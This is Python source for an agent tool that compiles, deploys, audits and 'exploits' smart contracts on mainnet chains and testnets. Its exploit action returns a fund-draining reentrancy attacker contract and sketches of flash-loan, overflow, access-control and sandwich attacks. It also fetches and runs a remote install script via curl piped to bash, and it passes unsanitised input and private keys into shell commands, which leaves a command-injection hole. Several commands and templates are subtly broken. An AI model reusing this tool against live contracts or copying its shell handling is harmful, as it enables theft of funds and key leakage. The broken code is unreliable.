"""Smart Contract Tool - Deploy, interact with, and exploit smart contracts."""

import json
import subprocess
from pathlib import Path
from datetime import datetime

CONTRACTS_DIR = Path(__file__).parent / "skill_data" / "contracts"
DEPLOY_LOG = Path(__file__).parent / "skill_data" / "deploy_log.json"

def get_tool_schema():
    return {
        "type": "function",
        "function": {
            "name": "smart_contract",
            "description": "Smart contract toolkit for blockchain security. Actions: compile, deploy, interact, audit, exploit, verify, estimate_gas.",
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {"type": "string", "enum": ["compile", "deploy", "interact", "audit", "exploit", "verify", "estimate_gas"]},
                    "chain": {"type": "string", "description": "Blockchain network (ethereum, polygon, bsc, arbitrum, localhost)"},
                    "contract": {"type": "string", "description": "Contract name or address"},
                    "method": {"type": "string", "description": "Function to call or exploit type"},
                    "args": {"type": "string", "description": "Function arguments as JSON array"},
                    "value": {"type": "string", "description": "ETH/BNB value to send (in wei)"},
                    "private_key": {"type": "string", "description": "Private key for signing (or use env)"},
                    "rpc_url": {"type": "string", "description": "RPC endpoint URL"}
                },
                "required": ["action"]
            }
        }
    }

RPC_ENDPOINTS = {
    "ethereum": "https://eth.llamarpc.com",
    "polygon": "https://polygon-rpc.com",
    "bsc": "https://bsc-dataseed.binance.org",
    "arbitrum": "https://arb1.arbitrum.io/rpc",
    "localhost": "http://127.0.0.1:8545",
    "sepolia": "https://rpc.sepolia.org",
    "goerli": "https://rpc.goerli.eth.gateway.fm"
}

def _cmd(cmd, timeout=120):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout, cwd=str(CONTRACTS_DIR))
        return {"stdout": r.stdout[:10000], "stderr": r.stderr[:5000], "code": r.returncode}
    except Exception as e:
        return {"error": str(e)}

def _log_deploy(chain, contract, address, tx_hash):
    DEPLOY_LOG.parent.mkdir(parents=True, exist_ok=True)
    log = json.loads(DEPLOY_LOG.read_text()) if DEPLOY_LOG.exists() else []
    log.append({
        "timestamp": datetime.now().isoformat(),
        "chain": chain,
        "contract": contract,
        "address": address,
        "tx_hash": tx_hash
    })
    DEPLOY_LOG.write_text(json.dumps(log, indent=2))

def _ensure_foundry():
    result = _cmd("forge --version 2>/dev/null")
    if result.get("error") or "not found" in result.get("stderr", ""):
        _cmd("curl -L https://foundry.paradigm.xyz | bash")
        _cmd("~/.foundry/bin/foundryup")
        return True
    return False

def run(action, chain="ethereum", contract="", method="", args="[]", value="0", private_key="", rpc_url=""):
    CONTRACTS_DIR.mkdir(parents=True, exist_ok=True)
    _ensure_foundry()

    rpc = rpc_url or RPC_ENDPOINTS.get(chain, RPC_ENDPOINTS["ethereum"])

    if action == "compile":
        if not contract:
            return json.dumps({"error": "contract name required"})
        result = _cmd(f"forge build --contracts {contract}.sol 2>&1")
        return json.dumps({
            "action": "compile",
            "contract": contract,
            "success": result.get("code") == 0,
            "output": result.get("stdout", ""),
            "errors": result.get("stderr", "") if result.get("code") != 0 else ""
        })

    elif action == "deploy":
        if not contract:
            return json.dumps({"error": "contract name required"})
        pk = private_key or "$PRIVATE_KEY"
        result = _cmd(
            f"forge create {contract}.sol:{contract} "
            f"--rpc-url {rpc} "
            f"--private-key {pk} "
            f"--value {value}wei "
            f"--json 2>&1"
        )
        output = result.get("stdout", "")
        try:
            data = json.loads(output)
            address = data.get("deployedTo", "")
            tx = data.get("deployTransaction", "")
            _log_deploy(chain, contract, address, tx)
            return json.dumps({
                "action": "deploy",
                "contract": contract,
                "chain": chain,
                "address": address,
                "tx_hash": tx,
                "explorer": f"https://{chain}.etherscan.io/address/{address}" if chain != "localhost" else ""
            })
        except:
            return json.dumps({
                "action": "deploy",
                "contract": contract,
                "output": output,
                "errors": result.get("stderr", "")
            })

    elif action == "interact":
        if not contract or not method:
            return json.dumps({"error": "contract and method required"})
        args_list = json.loads(args) if args else []
        args_str = " ".join([f'"{a}"' for a in args_list])
        pk = private_key or "$PRIVATE_KEY"
        result = _cmd(
            f"forge cast call {contract} {method}({args_str}) "
            f"--rpc-url {rpc} "
            f"--private-key {pk} 2>&1"
        )
        return json.dumps({
            "action": "interact",
            "contract": contract,
            "method": method,
            "result": result.get("stdout", ""),
            "errors": result.get("stderr", "") if result.get("code") != 0 else ""
        })

    elif action == "audit":
        if not contract:
            return json.dumps({"error": "contract name or address required"})
        findings = []
        
        slither = _cmd(f"slither {contract}.sol --json - 2>/dev/null | head -100")
        if slither.get("stdout"):
            findings.append({"tool": "slither", "output": slither.get("stdout", "")})

        mythril = _cmd(f"myth analyze {contract}.sol 2>/dev/null | head -100")
        if mythril.get("stdout"):
            findings.append({"tool": "mythril", "output": mythril.get("stdout", "")})

        adhoc = _cmd(f"grep -rn 'selfdestruct\\|suicide\\|delegatecall\\|tx.origin\\|block.timestamp\\|assembly' {contract}.sol 2>/dev/null")
        if adhoc.get("stdout"):
            findings.append({"tool": "adhoc", "output": adhoc.get("stdout", "")})

        common_vulns = {
            "reentrancy": "external call before state update",
            "overflow": "unchecked arithmetic",
            "front_running": "tx.origin authentication",
            "access_control": "missing onlyOwner",
            "flash_loan": "atomic price manipulation"
        }

        return json.dumps({
            "action": "audit",
            "contract": contract,
            "findings": findings,
            "common_vulnerabilities": common_vulns,
            "recommendation": "Review findings and patch before deployment"
        })

    elif action == "exploit":
        if not contract or not method:
            return json.dumps({"error": "contract and exploit method required"})
        
        exploits = {
            "reentrancy": {
                "description": "Reentrancy attack - drain funds via recursive calls",
                "template": """
contract ReentrancyAttacker {{
    address target;
    function attack() external payable {{
        target.call{{value: msg.value}}(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
    }}
    receive() external payable {{
        if (address(target).balance >= 1 ether) {{
            target.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        }}
    }}
}}
"""
            },
            "flash_loan": {
                "description": "Flash loan attack - manipulate price oracle",
                "template": """
contract FlashLoanAttacker {{
    function flashLoan(address token, uint256 amount) external {{
        IERC20(token).transfer(address(this), amount);
        // Manipulate price
        // Repay loan
        IERC20(token).transfer(msg.sender, amount);
    }}
}}
"""
            },
            "overflow": {
                "description": "Integer overflow - mint extra tokens",
                "template": """
// Call with amount = type(uint256).max / 2 + 1
// After overflow: balance becomes 0, but transfer succeeded
"""
            },
            "access_control": {
                "description": "Access control bypass - call restricted functions",
                "template": """
// Find functions without proper modifiers
// Call admin functions directly
// selfdestruct to destroy contract
"""
            },
            "sandwich": {
                "description": "Sandwich attack - front-run and back-run DEX trade",
                "template": """
// 1. Buy before victim (front-run)
// 2. Victim trade executes (price goes up)
// 3. Sell after victim (back-run)
// Profit = price difference - gas - fees
"""
            }
        }

        exploit_data = exploits.get(method, {"description": "Unknown exploit", "template": "Specify: reentrancy, flash_loan, overflow, access_control, sandwich"})
        
        return json.dumps({
            "action": "exploit",
            "contract": contract,
            "method": method,
            "exploit": exploit_data,
            "warning": "For educational/authorized testing only"
        })

    elif action == "verify":
        if not contract:
            return json.dumps({"error": "contract and address required"})
        result = _cmd(
            f"forge verify-contract {contract} {contract}.sol:{contract} "
            f"--chain {chain} --etherscan-api-key $ETHERSCAN_KEY 2>&1"
        )
        return json.dumps({
            "action": "verify",
            "contract": contract,
            "chain": chain,
            "output": result.get("stdout", ""),
            "success": result.get("code") == 0
        })

    elif action == "estimate_gas":
        if not contract or not method:
            return json.dumps({"error": "contract and method required"})
        args_list = json.loads(args) if args else []
        args_str = " ".join([f'"{a}"' for a in args_list])
        result = _cmd(
            f"forge estimate {contract} {method}({args_str}) "
            f"--rpc-url {rpc} 2>&1"
        )
        return json.dumps({
            "action": "estimate_gas",
            "contract": contract,
            "method": method,
            "gas_estimate": result.get("stdout", ""),
            "errors": result.get("stderr", "")
        })

    return json.dumps({"error": f"Unknown action: {action}"})


if __name__ == "__main__":
    print(run("audit", contract="VulnerableContract"))
